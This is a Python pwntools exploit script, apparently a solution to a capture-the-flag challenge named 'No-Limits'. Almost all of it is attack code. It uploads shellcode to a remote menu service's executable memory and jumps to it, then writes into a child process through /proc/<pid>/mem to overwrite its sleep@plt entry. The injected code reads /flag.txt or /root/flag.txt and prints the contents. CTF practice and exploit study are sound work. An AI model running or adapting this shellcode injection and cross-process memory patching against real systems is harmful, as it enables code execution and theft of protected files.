#!/usr/bin/env python3
from pwn import *
import argparse, re

context.clear(arch='amd64', os='linux')

RE_CHILD = re.compile(br"Child PID\s*=\s*(\d+)")
RE_BUF   = re.compile(br"Wrote your buffer at\s*(0x[0-9a-fA-F]+)")

SLEEP_PLT = 0x401290

def recv_menu(io, t=8.0):
    io.recvuntil(b"1) Create Memory", timeout=t)
    io.recvuntil(b"4) Exit", timeout=t)

def get_child_pid(io, t=6.0):
    io.sendline(b"2")
    data = io.recvrepeat(t)
    m = RE_CHILD.search(data)
    if not m:
        io.sendline(b"2")
        data += io.recvrepeat(t)
        m = RE_CHILD.search(data)
    if not m:
        raise RuntimeError("Could not parse child PID")
    return int(m.group(1))

def create_memory(io, payload: bytes, perms: int = 7, t=12.0) -> str:
    recv_menu(io, t)
    io.sendline(b"1")
    io.recvuntil(b"How big", timeout=t)
    io.sendline(str(len(payload)+1).encode())
    io.recvuntil(b"permissions", timeout=t)
    io.sendline(str(perms).encode())
    io.recvuntil(b"What do you want to include?", timeout=t)
    io.send(payload + b"\n")
    line = io.recvline(timeout=t) or b""
    if b"Wrote your buffer at" not in line:
        try: line += io.recvuntil(b"\n", timeout=1, drop=False)
        except: pass
    m = RE_BUF.search(line)
    return m.group(1).decode() if m else None

def execute_address(io, addr: str, t=8.0):
    recv_menu(io, t)
    io.sendline(b"3")
    io.recvuntil(b"Where do you want to execute code?", timeout=t)
    io.sendline(addr.encode())

def build_child_shellcode():
    return asm(
        ".intel_syntax noprefix\n"
        "push rbp\n"
        "mov rbp, rsp\n"
        "sub rsp, 0x300\n"
        "lea rdi, [rip+p1]\n"
        "xor rsi, rsi\n"
        "xor rdx, rdx\n"
        "mov rax, 2\n"
        "syscall\n"
        "test rax, rax\n"
        "js tr\n"
        "jmp got\n"
        "tr:\n"
        "lea rdi, [rip+p2]\n"
        "xor rsi, rsi\n"
        "xor rdx, rdx\n"
        "mov rax, 2\n"
        "syscall\n"
        "test rax, rax\n"
        "js dn\n"
        "got:\n"
        "mov rdi, rax\n"
        "lea rsi, [rbp-0x200]\n"
        "mov rdx, 0x200\n"
        "xor rax, rax\n"
        "syscall\n"
        "mov rdx, rax\n"
        "mov rax, 1\n"
        "mov rdi, 1\n"
        "lea rsi, [rbp-0x200]\n"
        "syscall\n"
        "mov rax, 1\n"
        "mov rdi, 2\n"
        "lea rsi, [rbp-0x200]\n"
        "syscall\n"
        "dn:\n"
        "mov rax, 60\n"
        "xor rdi, rdi\n"
        "syscall\n"
        "p1: .string \"/flag.txt\"\n"
        "p2: .string \"/root/flag.txt\"\n"
    )

def build_writer(child_pid: int, shell_addr: int, blob: bytes, allow_newlines=False):
    def msg_bytes(s): return s.encode()
    path = f"/proc/{child_pid}/mem".encode()

    asm_code_diag = (
        ".intel_syntax noprefix\n"
        "push rbp\n"
        "mov rbp, rsp\n"
        "sub rsp, 0x80\n"
        "lea rdi, [rip+db_path]\n"
        "mov rsi, 2\n"
        "xor rdx, rdx\n"
        "mov rax, 2\n"
        "syscall\n"
        "mov r12, rax\n"
        "test rax, rax\n"
        "js open_fail\n"
        "mov rdi, 1\n"
        "lea rsi, [rip+msg1]\n"
        f"mov rdx, {len(msg_bytes('OPEN_OK\\n'))}\n"
        "mov rax, 1\n"
        "syscall\n"
        "mov rdi, r12\n"
        f"mov rsi, {shell_addr}\n"
        "xor rdx, rdx\n"
        "mov rax, 8\n"
        "syscall\n"
        "test rax, rax\n"
        "js seek_fail\n"
        "mov rdi, 1\n"
        "lea rsi, [rip+msg2]\n"
        f"mov rdx, {len(msg_bytes('LSEEK_OK\\n'))}\n"
        "mov rax, 1\n"
        "syscall\n"
        "mov rdi, r12\n"
        "lea rsi, [rip+db_blob]\n"
        f"mov rdx, {len(blob)}\n"
        "mov rax, 1\n"
        "syscall\n"
        f"cmp rax, {len(blob)}\n"
        "jl write_fail\n"
        "mov rdi, 1\n"
        "lea rsi, [rip+msg3]\n"
        f"mov rdx, {len(msg_bytes('PATCH_OK\\n'))}\n"
        "mov rax, 1\n"
        "syscall\n"
        "jmp stay_alive\n"
        "open_fail:\n"
        "mov rdi, 1\n"
        "lea rsi, [rip+msg4]\n"
        f"mov rdx, {len(msg_bytes('OPEN_FAIL\\n'))}\n"
        "mov rax, 1\n"
        "syscall\n"
        "jmp stay_alive\n"
        "seek_fail:\n"
        "mov rdi, 1\n"
        "lea rsi, [rip+msg5]\n"
        f"mov rdx, {len(msg_bytes('LSEEK_FAIL\\n'))}\n"
        "mov rax, 1\n"
        "syscall\n"
        "jmp stay_alive\n"
        "write_fail:\n"
        "mov rdi, 1\n"
        "lea rsi, [rip+msg6]\n"
        f"mov rdx, {len(msg_bytes('WRITE_FAIL\\n'))}\n"
        "mov rax, 1\n"
        "syscall\n"
        "stay_alive:\n"
        "mov rax, 24\n"
        "syscall\n"
        "jmp stay_alive\n"
        "db_path:\n" + ".byte " + ",".join(str(b) for b in path + b"\x00") + "\n" +
        "db_blob:\n" + ".byte " + ",".join(str(b) for b in blob) + "\n" +
        "msg1:\n" + ".byte " + ",".join(str(b) for b in msg_bytes("OPEN_OK\n")) + "\n" +
        "msg2:\n" + ".byte " + ",".join(str(b) for b in msg_bytes("LSEEK_OK\n")) + "\n" +
        "msg3:\n" + ".byte " + ",".join(str(b) for b in msg_bytes("PATCH_OK\n")) + "\n" +
        "msg4:\n" + ".byte " + ",".join(str(b) for b in msg_bytes("OPEN_FAIL\n")) + "\n" +
        "msg5:\n" + ".byte " + ",".join(str(b) for b in msg_bytes("LSEEK_FAIL\n")) + "\n" +
        "msg6:\n" + ".byte " + ",".join(str(b) for b in msg_bytes("WRITE_FAIL\n")) + "\n"
    )

    asm_code_nolf = (
        ".intel_syntax noprefix\n"
        "push rbp\n"
        "mov rbp, rsp\n"
        "sub rsp, 0x80\n"
        "lea rdi, [rip+db_path]\n"
        "mov rsi, 2\n"
        "xor rdx, rdx\n"
        "mov rax, 2\n"
        "syscall\n"
        "mov r12, rax\n"
        "test rax, rax\n"
        "js stay_alive\n"
        "mov rdi, r12\n"
        f"mov rsi, {shell_addr}\n"
        "xor rdx, rdx\n"
        "mov rax, 8\n"
        "syscall\n"
        "test rax, rax\n"
        "js stay_alive\n"
        "mov rdi, r12\n"
        "lea rsi, [rip+db_blob]\n"
        f"mov rdx, {len(blob)}\n"
        "mov rax, 1\n"
        "syscall\n"
        "stay_alive:\n"
        "mov rax, 24\n"
        "syscall\n"
        "jmp stay_alive\n"
        "db_path:\n" + ".byte " + ",".join(str(b) for b in path + b"\x00") + "\n" +
        "db_blob:\n" + ".byte " + ",".join(str(b) for b in blob) + "\n"
    )

    code = asm(asm_code_diag if allow_newlines else asm_code_nolf)
    if not allow_newlines and b"\x0a" in code:
        # extremely unlikely here, but if it happens, force diagnostic variant and trust fgets to read until that \n is late
        code = asm(asm_code_diag)
    return code

def main():
    ap = argparse.ArgumentParser(description="No-Limits: patch child sleep@plt via /proc/<pid>/mem (newline-safe upload)")
    ap.add_argument("-H","--host", required=True)
    ap.add_argument("-P","--port", required=True, type=int)
    ap.add_argument("--log", default="info", choices=["debug","info","warn","error"])
    args = ap.parse_args()
    context.log_level = args.log

    io = remote(args.host, args.port, timeout=10)
    pid = get_child_pid(io)
    log.info(f"Child PID: {pid}")

    child_sc = build_child_shellcode()
    writer   = build_writer(pid, SLEEP_PLT, child_sc, allow_newlines=False)

    if b"\x0a" in writer:
        log.warning("writer contains newline; switching to diagnostic variant (may still work if \\n is late)")
        writer = build_writer(pid, SLEEP_PLT, child_sc, allow_newlines=True)

    addr = create_memory(io, writer, perms=7)
    if not addr:
        log.failure("upload failed"); return
    log.info(f"writer payload @ {addr}")
    execute_address(io, addr)

    io.interactive()

if __name__ == "__main__":
    main()